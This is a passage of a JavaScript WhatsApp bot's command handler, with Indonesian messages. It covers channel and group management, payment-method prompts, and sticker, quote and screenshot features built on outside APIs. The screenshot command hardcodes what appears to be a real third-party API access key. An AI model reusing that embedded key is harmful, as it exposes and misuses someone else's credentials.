					newReply('Terjadi kesalahan saat mengatur mode reaksi.');
				}
			}
			break;

			case 'setnewsletterdesc':{
				if (!isCreator) return newReply(mess.owner);
				if (!args.join(' ')) return newReply('Penggunaan: setnewsletterdesc <deskripsi>\n\nContoh:\nsetnewsletterdesc Ini deskripsi baru.');	
				const description = args.join(' ');
				try {
					await sock.newsletterUpdateDescription(saluran, description);
					newReply('Berhasil mengubah deskripsi newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengubah deskripsi.');
				}
			}
			break;

			case 'setnewslettername':{
				if (!isCreator) return newReply(mess.owner);
				if (!args.join(' ')) return newReply('Penggunaan: setnewslettername <nama>\n\nContoh:\nsetnewslettername Nama Baru Newsletter.');	
				const name = args.join(' ');
				try {
					await sock.newsletterUpdateName(saluran, name);
					newReply('Berhasil mengubah nama newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengubah nama.');
				}
			}
			break;

			case 'setnewsletterpic':{
				if (!isCreator) return newReply(mess.owner);
				if (!m.quoted || !m.quoted.isMedia) return newReply('Balas sebuah gambar untuk dijadikan foto profil newsletter.');	
				try {
					const media = await m.quoted.download();
					await sock.newsletterUpdatePicture(saluran, media);
					newReply('Berhasil mengubah foto profil newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengubah foto profil.');
				}
			}
			break;

			case 'removenewsletterpic':{
				if (!isCreator) return newReply(mess.owner);
				try {
					await sock.newsletterRemovePicture(saluran);
					newReply('Berhasil menghapus foto profil newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat menghapus foto profil.');
				}
			}
			break;

			case 'follownewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterFollow(data.id);
					newReply('Berhasil mengikuti newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mengikuti newsletter.');
				}
			}
			break;

			case 'unfollownewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterUnfollow(data.id);
					newReply('Berhasil berhenti mengikuti newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat berhenti mengikuti newsletter.');
				}
			}
			break;

			case 'mutenewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterMute(data.id);
					newReply('Berhasil mematikan pemberitahuan dari newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat mematikan pemberitahuan.');
				}
			}
			break;

			case 'unmutenewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterUnmute(data.id);
					newReply('Berhasil menghidupkan pemberitahuan dari newsletter.');
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat menghidupkan pemberitahuan.');
				}
			}
			break;
	
			case 'createnewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!args[0] || !args[1]) return newReply('Penggunaan: createnewsletter <nama> | <deskripsi>\n\nContoh:\ncreatenewsletter Newsletter Baru | Ini deskripsi newsletter.');
				const [newsletterName, newsletterDesc] = args.join(' ').split('|').map((v) => v.trim());
				if (!newsletterName || !newsletterDesc) {
					return newReply('Format salah. Gunakan "|" untuk memisahkan nama dan deskripsi.');
				}
				try {
					const result = await sock.newsletterCreate(newsletterName, newsletterDesc);
					newReply(`Newsletter berhasil dibuat.\n\nNama: ${result.name}\nDeskripsi: ${result.description}`);
				} catch (err) {
					console.error(err);
					newReply('Terjadi kesalahan saat membuat newsletter.');
				}
			}
			break;

			case 'newsletterinfo':
			case 'getnewsletterinfo':{
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply(`Kirim perintah ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				function formatDate(timestamp) {
					const date = new Date(timestamp * 1000);
					const months = [
						'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
						'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
					];
					const day = date.getDate();
					const month = months[date.getMonth()];
					const year = date.getFullYear();
					return `${day} ${month} ${year}`;
				}
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					let teks = `「 *NEWSLETTER METADATA* 」\n\n`;
					teks += `- *Name*: ${data.name}\n`;
					teks += `- *ID*: ${data.id}\n`;
					teks += `- *Status*: ${data.state}\n`;
					teks += `- *Dibuat Pada*: ${formatDate(data.creation_time)}\n`;
					teks += `- *Subscribers*: ${data.subscribers}\n`;
					teks += `- *Meta Verify*: ${data.verification}\n`;
					teks += `- *React Emoji*: ${data.reaction_codes}\n`;
					teks += `- *Description*:\n${data.description}\n`;
					let button = [{
						"name": "cta_copy",
						"buttonParamsJson": `{
							"display_text": "Copy Newsletter ID",
							"id": "${data.id}",
							"copy_code": "${data.id}"
						}`
					}];
					sock.sendButtonText(m.chat, button, teks, footer, m)
				} catch (error) {
					newReply('*Data tidak ditemukan!* ☹️');
				}
			}
			break;
			// End New Feature (Beta Feature)

			case 'listpc': {
				if (!isCreator) return newReply(mess.owner);
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id);
				let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`;
				for (let i of anu) {
					let nama = store.messages[i].array[0].pushName;
					teks += `*Name*: ${nama}\n`;
					teks += `*User*: @${i.split('@')[0]}\n`;
					teks += `*Chat*: https://wa.me/${i.split('@')[0]}\n\n`;
					teks += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
				}
				newReply(teks)
			}
			break;

			case 'listgc': {
				if (!isCreator) return newReply(mess.owner);
				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id);
				let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`;
				for (let i of anu) {
					let metadata = await sock.groupMetadata(i);
					teks += `*Name*: ${metadata.subject}\n`;
					teks += `*Admin*: ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n`;
					teks += `*ID*: ${metadata.id}\n`;
					teks += `*Made*: ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`;
					teks += `*Member*: ${metadata.participants.length}\n\n`;
					teks += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
				}
				newReply(teks)
			}
			break;

			case 'listonline': case 'liston': {
				if (!m.isGroup) return newReply(mess.group);
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await sock.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `@` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => newReply('*Data tidak ditemukan! ☹️*'))
			}
			break;

			case 'creategroup':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply('Penggunaan: creategroup <nama grup> | <nomor anggota dipisahkan koma>\n*Kirim perintah*: creategroup Grup Baru | 6281234567890,6289876543210');
				const [groupName, members] = text.split('|').map(v => v.trim());
				if (!groupName || !members) return newReply('Format salah!');
				const participants = members.split(',').map(num => `${num}@s.whatsapp.net`);
				try {
					const groupInfo = await sock.groupCreate(groupName, participants);
					newReply(`*Grup berhasil dibuat*:\n- *Nama*: ${groupInfo.subject}\n- *ID*: ${groupInfo.id}`);
				} catch (err) {
					console.error(err);
					newReply('Gagal membuat grup.');
				}
			}
			break;

			case 'group':
			case 'grup': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (args[0] === 'close') {
					await sock.groupSettingUpdate(m.chat, 'announcement')
						.then(() => newReply('✅ Grup berhasil ditutup, hanya admin yang bisa mengirim pesan sekarang! 🔒'))
						.catch((err) => newReply(`⚠️ Gagal menutup grup: ${err}`));
				} else if (args[0] === 'open') {
					await sock.groupSettingUpdate(m.chat, 'not_announcement')
						.then(() => newReply('✅ Grup berhasil dibuka, semua anggota bisa mengirim pesan sekarang! 🔓'))
						.catch((err) => newReply(`⚠️ Gagal membuka grup: ${err}`));
				} else {
					newReply(`⚙️ Penggunaan perintah:\n · *${prefix + command} open* → Buka grup\n · *${prefix + command} close* → Tutup grup`);
				}
			}
			break;

			case 'getpp': {
				if (!isPremium) return newReply(mess.premium);
				if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Silahkan tag orangnya ya, kak!`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					avatar = await sock.profilePictureUrl(users, "image")
				} catch {
					avatar = 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg'
				}
				try {
					sock.sendMessage(m.chat, {
						image: {
							url: avatar
						},
						caption: mess.done
					}, {
						quoted: m
					})
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'getppgc': {
				if (!isPremium) return newReply(mess.premium);
				if (!m.isGroup) return newReply(mess.group);
				try {
					avatar = await sock.profilePictureUrl(m.chat, "image")
				} catch {
					avatar = 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg'
				}
				try {
					sock.sendMessage(m.chat, {
						image: {
							url: avatar
						},
						caption: mess.done
					}, {
						quoted: m
					})
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'getname': {
				if (!isPremium) return newReply(mess.premium);
				if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Silahkan tag orangnya ya, kak!`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					let name = sock.getName(users);
					newReply(name);
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case 'getnamegc':
			case 'getsubject': {
				if (!isPremium) return newReply(mess.premium);
				if (!m.isGroup) return newReply(mess.group)
				try {
					newReply(groupName);
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			};
			break

			case 'getdesk':
			case 'metadatadesc':
			case 'getdesc': {
				if (!isPremium) return newReply(mess.premium);
				if (!m.isGroup) return newReply(mess.group);
				try {
					newReply(groupMetadata.desc)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			};
			break

			case 'editinfo': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (args[0] === 'open') {
					await sock.groupSettingUpdate(m.chat, 'unlocked')
						.then(() => newReply('✅ Anggota sekarang bisa mengedit info grup! 📛✨'))
						.catch((err) => newReply(`⚠️ Gagal membuka izin edit info grup: ${err}`));
				} else if (args[0] === 'close') {
					await sock.groupSettingUpdate(m.chat, 'locked')
						.then(() => newReply('✅ Hanya admin yang bisa mengedit info grup sekarang! 🔒🛡️'))
						.catch((err) => newReply(`⚠️ Gagal menutup izin edit info grup: ${err}`));
				} else {
					newReply(`⚙️ Penggunaan perintah:\n · *${prefix + command} open* → Izinkan anggota mengedit info grup\n · *${prefix + command} close* → Hanya admin yang bisa mengedit info grup`);
				}
			}
			break;

			case 'linkgroup':
			case 'linkgrup':
			case 'linkgc':
			case 'gclink':
			case 'grouplink':
			case 'gruplink':
			case 'invitecode':{
				if (!m.isGroup) return newReply('Perintah ini hanya dapat digunakan dalam grup.');
				try {
					const inviteCode = await groupInviteCode(m.chat);
					newReply(`Kode undangan grup:\nhttps://chat.whatsapp.com/${inviteCode}`);
				} catch (err) {
					console.error(err);
					newReply('Gagal mendapatkan kode undangan grup.');
				}
			}
			break;

			case 'speedtest': case 'speed': {
				if (!isCreator) return newReply(mess.owner);
				let cp = require('child_process');
				let { promisify } = require('util');
				let exec = promisify(cp.exec).bind(cp);
				let o
					try {
						o = await exec('python3 speed.py');
					} catch (e) {
						o = e
					} finally {
						let { stdout, stderr } = o
						if (stdout.trim()) newReply(stdout);
						if (stderr.trim()) newReply(stderr);
					}
				}
			break;

			case 'pay':
			case 'payment': {
				let button = [{
					"name": "single_select",
					"buttonParamsJson": `{
						"title": "Metode Pembayaran",
						"sections": [
							{
								"title": "Pilih Metode Pembayaran",
								"rows": [
									{
										"header": "💳 Dana",
										"title": "Dana - Pilih untuk detail",
										"id": "${prefix}paymethod dana"
									},
									{
										"header": "💵 GoPay",
										"title": "GoPay - Pilih untuk detail",
										"id": "${prefix}paymethod gopay"
									},
									{
										"header": "📱 OVO",
										"title": "OVO - Pilih untuk detail",
										"id": "${prefix}paymethod ovo"
									},
									{
										"header": "🔗 QRIS",
										"title": "QRIS - Pilih untuk detail",
										"id": "${prefix}paymethod qris"
									},
									{
										"header": "🛍️ ShopeePay",
										"title": "ShopeePay - Pilih untuk detail",
										"id": "${prefix}paymethod shopeepay"
									},
									{
										"header": "🏦 SeaBank",
										"title": "SeaBank - Pilih untuk detail",
										"id": "${prefix}paymethod seabank"
									}
								]
							}
						]
					}`
				}];
				sock.sendButtonText(
					m.chat,
					button,
					"Silakan pilih metode pembayaran di bawah ini untuk melanjutkan transaksi:",
					"Metode Pembayaran",
					m
				);
			}
			break;

			case 'paymethod': {
				if (!args[0]) {
					newReply(`Silakan pilih metode pembayaran:\n\n💳 *Dana*: ${prefix + command} dana\n💵 *GoPay*: ${prefix + command} gopay\n📱 *OVO*: ${prefix + command} ovo\n🔗 *QRIS*: ${prefix + command} qris\n🛍️ *ShopeePay*: ${prefix + command} shopeepay\n🏦 *SeaBank*: ${prefix + command} seabank`);
				} else {
					switch (args[0].toLowerCase()) {
						case 'dana':
							newReply(`💳 *Dana*\n\nSilakan transfer ke nomor berikut:\n*${payment.dana}*\n\nSetelah transfer, kirim bukti pembayaran ke sini.`);
							break;
						case 'gopay':
							newReply(`💵 *GoPay*\n\nSilakan transfer ke nomor berikut:\n*${payment.gopay}*\n\nSetelah transfer, kirim bukti pembayaran ke sini.`);
							break;
						case 'ovo':
							newReply(`📱 *OVO*\n\nSilakan transfer ke nomor berikut:\n*${payment.ovo}*\n\nSetelah transfer, kirim bukti pembayaran ke sini.`);
							break;
						case 'qris':
							let paymentBuffer = await getBuffer(`${payment.qris}`);
							await newReply(`🔗 *QRIS*\n\nScan QR berikut untuk melakukan pembayaran:`);
							m.reply({ image: paymentBuffer, caption: "Scan QR ini untuk pembayaran." })
							break;
						case 'shopeepay':
							newReply(`🛍️ *ShopeePay*\n\nSilakan transfer ke nomor berikut:\n*${payment.shopeePay}*\n\nSetelah transfer, kirim bukti pembayaran ke sini.`);
							break;
						case 'seabank':
							newReply(`🏦 *SeaBank*\n\nSilakan transfer ke nomor rekening berikut:\n*${payment.seabank}*\n\nSetelah transfer, kirim bukti pembayaran ke sini.`);
							break;
						default:
							newReply(`Metode pembayaran tidak valid. Pilih salah satu dari:\n\n💳 *Dana*\n💵 *GoPay*\n📱 *OVO*\n🔗 *QRIS*\n🛍️ *ShopeePay*\n🏦 *SeaBank*`);
					}
				}
			};
			break;

			case 'tes':
			case 'test': {
				m.reply({
					text: 'Ini adalah teks di bagian judul.',
					footer: 'Ini adalah teks di bagian footer.',
					buttons: [
						{
							buttonId: `.me`,
							buttonText: { displayText: "🙂" }
						},
						{
							buttonId: `.me`,
							buttonText: { displayText: "😐" }
						},
						{
							buttonId: `.me`,
							buttonText: { displayText: "☹️" }
						}
					],
					viewOnce: true
				});
			}
			break;

			case 'owner':
			case 'creator': {
				await sock.sendMessage(
					m.chat, 
					{
						contacts: {
							displayName: ownerName,
							contacts: contacts
						}
					}, {
						quoted: m
					}
				);
			}
			break;

			case 'brat':
			case 'anomali': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Contoh : ${prefix + command} Hai kak`)
				if (text.length > 101) return newReply(`Karakter terbatas, max 100!`)
				let caption = 'Yuk pilih tipe *brat* yang Kamu suka, ada beberapa tipe nih! Klik *tombol* di bawah ini ya, kak! 😋👇';
				m.reply({
					text: caption,
					footer: footer,
					buttons: [
						{
							buttonId: `${prefix}bratgambar ${text}`,
							buttonText: { displayText: "Gambar" }
						},
						{
							buttonId: `${prefix}bratvideo ${text}`,
							buttonText: { displayText: "Video" }
						}
					],
					viewOnce: true
				});
			}
			break;

			case 'bratgambar': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (m.sender in enhance) return newReply(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`);	
				if (!text) return newReply(`Contoh : ${prefix + command} Hai kak`);
				if (text.length > 101) return newReply(`Karakter terbatas, max 100!`);
				enhance[m.sender] = true;
				await m.react('⏱️');
				try {
					const buffer = await getBuffer(`https://siputzx-bart.hf.space/?q=${encodeURIComponent(text)}`);
					await m.react('✅');
					sock.sendImageAsSticker(m.chat, buffer, m, { packname: botName, author: ownerName });
				} catch (err) {
					newReply('Terjadi kesalahan saat membuat stiker gambar. 😞');
				}
				delete enhance[m.sender];
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'bratvideo': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (m.sender in enhance) return newReply(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`);
				if (!text) return newReply(`Contoh : ${prefix + command} Hai kak`);
				if (text.length > 101) return newReply(`Karakter terbatas, max 100!`);
				enhance[m.sender] = true;
				const words = text.split(" ");
				const tempDir = path.join(process.cwd(), 'temp');
				if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
				const framePaths = [];
				await m.react('⏱️');
				try {
					for (let i = 0; i < words.length; i++) {
						const currentText = words.slice(0, i + 1).join(" ");
						const res = await axios.get(`https://siputzx-bart.hf.space/?q=${encodeURIComponent(currentText)}`, { responseType: "arraybuffer" }).catch((e) => e.response);
						const framePath = path.join(tempDir, `frame${i}.mp4`);
						fs.writeFileSync(framePath, res.data);
						framePaths.push(framePath);
					}
					const fileListPath = path.join(tempDir, "filelist.txt");
					let fileListContent = "";
					for (let i = 0; i < framePaths.length; i++) {
						fileListContent += `file '${framePaths[i]}'\n`;
						fileListContent += `duration 0.7\n`;
					}
					fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
					fileListContent += `duration 2\n`;
					fs.writeFileSync(fileListPath, fileListContent);
					const outputVideoPath = path.join(tempDir, "output.mp4");
					await execSync(`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`);
					await m.react('✅');
					await sock.sendImageAsSticker(m.chat, outputVideoPath, m, {
						packname: botName,
						author: ownerName
					});
					framePaths.forEach((frame) => {
						if (fs.existsSync(frame)) fs.unlinkSync(frame);
					});
					if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath);
					if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath);
				} catch (e) {
					console.error(e);
					newReply(mess.error);
				}
				delete enhance[m.sender];
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'bratip': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (m.sender in enhance) return newReply(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`);
				if (!text) return newReply(`Contoh : ${prefix + command} Hai kak`);
				if (text.length > 101) return newReply(`Karakter terbatas, max 100!`);
				// Menandai proses dimulai untuk pengguna
				enhance[m.sender] = true;
				await m.react('⏱️');
				try {
					const buffer = await getBuffer(`https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`);
					await m.react('✅');
					sock.sendImageAsSticker(m.chat, buffer, m, { packname: botName, author: ownerName });
				} catch (err) {
					newReply('Terjadi kesalahan saat membuat stiker gambar. 😞');
				}
				// Menghapus status proses setelah selesai
				delete enhance[m.sender];
				// Mengurangi limit pengguna
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'ssweb': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply('Masukkan URL untuk di-screenshot!');
				await m.react('⏱️');
				let sswebfull = `https://api.apiflash.com/v1/urltoimage?access_key=9a202a61afaa4ba0877f12f03e86ea96&url=${encodeURIComponent(text)}&format=png&fresh=true&full_page=true&response_type=json&no_cookie_banners=true&no_ads=true&no_tracking=true&time_zone=Asia/Jakarta`;
				try { 
					let data = await fetch(sswebfull);
					let json = await data.json(); 
					if (!json.url) {
						return newReply('Gagal mengambil screenshot. Pastikan URL yang dimasukkan valid.');
					}
					await sock.sendMessage(m.chat, {
						image: {url: json.url},
						caption: mess.done
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.error(error);
					newReply('Terjadi kesalahan saat mengambil screenshot.');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'quotechat':
			case 'quote':
			case 'qc':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply('Input teksnya!')
				const sender = m.sender
				const username = await sock.getName(m.quoted ? m.quoted.sender : sender)
				const avatar = await sock.profilePictureUrl(m.quoted ? m.quoted.sender : sender, "image").catch(() => 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg')
				const json = {
					type: "quote",
					format: "png",
					backgroundColor: "#FFFFFF",
					width: 512,
					height: 512,
					scale: 2,
					"messages": [
						{
							"entities": [],
							"avatar": true,
							"from": {
								"id": 1,
								"name": username,
								"photo": {
									"url": avatar
								}
							},
							"text": text,
							"replyMessage": {}
						}
					],
				};
				axios.post("https://bot.lyo.su/quote/generate", json, {
					headers: {"Content-Type": "application/json"},
				})
				.then(async (res) => {
					const buffer = Buffer.from(res.data.result.image, "base64");
					let encmedia = await sock.sendImageAsSticker(m.chat, buffer, m, { packname: botName, author: ownerName, categories: ['🤩', '🎉'], id: '12345', quality: 100, background: 'transparent'})
					await fs.unlinkSync(encmedia)
				})
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'quotecolor': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply('Input teksnya!')
				const sender = m.sender;
				const username = await sock.getName(m.quoted ? m.quoted.sender : sender);
				const avatar = await sock.profilePictureUrl(m.quoted ? m.quoted.sender : sender, "image").catch(() => 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg');	
				// Memisahkan teks dan warna background jika ada
				const parts = text.split(' ');
				const hexColor = /^#[0-9A-F]{6}$/i.test(parts[parts.length - 1]) ? parts.pop() : "#FFFFFF"; // Mengambil warna background jika ada
				const customText = parts.join(' '); // Teks yang akan digunakan
				// Mengecek apakah warna background valid
				if (!/^#[0-9A-F]{6}$/i.test(hexColor)) {
					return newReply('Warna background tidak valid! Gunakan format hex seperti #FF5733.');
				}
				const json = {
					type: "quote",
					format: "png",
					backgroundColor: hexColor, // Menggunakan warna yang dikustomisasi
					width: 512,
					height: 512,
					scale: 2,
					"messages": [
						{
							"entities": [],
							"avatar": true,
							"from": {
								"id": 1,
								"name": username,
								"photo": {
									"url": avatar
								}
							},
							"text": customText, // Menggunakan teks yang sudah diproses
							"replyMessage": {}
						}
					],
				};
				try {
					// Mengirim request untuk membuat gambar dengan quote
					const res = await axios.post("https://bot.lyo.su/quote/generate", json, {
						headers: { "Content-Type": "application/json" },
					});
					// Menyimpan gambar yang diterima dan mengirimkannya sebagai stiker
					const buffer = Buffer.from(res.data.result.image, "base64");
					let encmedia = await sock.sendImageAsSticker(m.chat, buffer, m, { 
						packname: botName, 
						author: ownerName, 
						categories: ['🤩', '🎉'], 
						id: '12345', 
						quality: 100, 
						background: 'transparent'
					});
					// Menghapus file sementara setelah digunakan
					await fs.unlinkSync(encmedia);
				} catch (err) {
					// Menangani error jika terjadi kesalahan pada request atau pengiriman gambar
					console.error(err);
					newReply("❌ Terjadi kesalahan saat memproses request. Coba lagi nanti!");
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 's': case 'sticker': case 'stiker': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(`Aduh, kak, limitmu habis! 🥲 Coba upgrade jadi premium ya!`);
				if (!quoted) return newReply(`Kirim atau balas gambar/video/gif dengan caption ${prefix + command}\nDurasi video 1-9 detik ya!`);
				if (!mime) return newReply(`Kirim atau balas gambar/video/gif dengan caption ${prefix + command}\nDurasi video 1-9 detik ya!`);
				if (/image/.test(mime)) {
					await m.react('⏱️');
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					await sock.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
				} else if (/video/.test(mime)) {
					if ((quoted.msg || quoted).seconds > 9) return newReply(`Durasi video terlalu panjang! 🕒 Kirim video dengan durasi 1-9 detik ya!`);
					await m.react('⏱️');
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					await sock.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
				} else {
					newReply(`Kirim atau balas gambar/video/gif dengan caption ${prefix + command}\nDurasi video 1-9 detik ya!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'swm': case 'steal': case 'stickerwm': case 'take': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(`Aduh, kak, limitmu habis! 🥲 Coba upgrade jadi premium ya!`);
				if (!isPremium) return newReply(mess.premium);
				if (!quoted) return newReply(`Kirim atau balas gambar/video/gif dengan caption ${prefix + command}\nDurasi video 1-9 detik ya!`);
				if (!mime) return newReply(`Kirim atau balas gambar/video/gif dengan caption ${prefix + command}\nDurasi video 1-9 detik ya!`);
				const swn = args.join(" ");
				const pcknm = swn.split("|")[0];
				const atnm = swn.split("|")[1];
				if (m.quoted.isAnimated === true) {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					sock.sendMessage(m.chat, { 
						sticker: media 
					}, m, { 
						packname: pcknm, 
						author: atnm 
					});
				} else if (/image/.test(mime)) {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					await sock.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm });
				} else if (/video/.test(mime)) {
					if ((quoted.msg || quoted).seconds > 9) return newReply('Video terlalu panjang, maksimal 9 detik ya! ⏳');
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					await sock.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm });
				} else {
					newReply(`Kirim foto/video untuk dipakai ya, kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'smeme': case 'stickermeme': case 'stickmeme': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(`Limit habis, kak! Coba upgrade premium untuk lanjut!`);
				if (!isPremium) return newReply(mess.premium);
				if (!/webp/.test(mime) && /image/.test(mime)) {
					if (!text) return newReply(`Penggunaan: ${prefix + command} teks_atas|teks_bawah`);
					atas = text.split('|')[0] ? text.split('|')[0] : '';
					bawah = text.split('|')[1] ? text.split('|')[1] : '';
					let mee = await sock.downloadAndSaveMediaMessage(quoted);
					let mem = await CatBox(mee);
					let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`;
					await sock.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author });
				} else {
					newReply(`Kirim atau balas gambar dengan caption ${prefix + command} teks_atas|teks_bawah untuk membuat meme!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'ttsbluearchive':
			case 'ttsba': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply('Yahh, maaf kak, limit Kamu udah habis. Kalau mau lebih banyak, coba upgrade ke premium ya! 😘');
				if (!isPremium) return newReply('Fitur ini cuma buat yang premium kak, coba di-upgrade dulu yuk biar MiwaAI bisa bantu lebih banyak! 😇');
				if (!text) return newReply(`Hmm, kayaknya ada yang kurang deh, coba gini kak:\n${prefix + command} Aku suka nasi goreng,momoi`);
				try {
					let [message, char, speed] = text.split(',');
					if (!message || !char) return newReply(`Yuk dicoba lagi kak! Contohnya gini ya:\n${prefix + command} Aku suka nasi goreng,momoi`);

					const suppVoice = [
						'airi', 'akane', 'akari', 'ako', 'aris', 'arona', 'aru', 'asuna', 'atsuko', 'ayane', 
						'azusa', 'cherino', 'chihiro', 'chinatsu', 'chise', 'eimi', 'erica', 'fubuki', 'fuuka', 
